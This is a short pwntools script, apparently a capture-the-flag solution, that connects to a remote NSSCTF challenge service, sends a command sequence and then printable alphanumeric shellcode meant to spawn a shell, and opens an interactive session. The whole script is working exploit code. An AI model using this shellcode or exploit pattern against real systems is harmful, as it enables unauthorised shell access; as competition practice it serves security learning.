from pwn import *

# p = process('./service')
p = remote('node4.anna.nssctf.cn', 28912)

payload = b'opt:1\r\nmsg:ro0t\r\n'
p.recvuntil(b'>>>')
p.sendline(payload)
payload = b'opt:2\r\nmsg:RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA\r\n'
p.recvuntil(b'>>>')
p.sendline(payload)
# p.sendline(b'ls')
p.interactive()
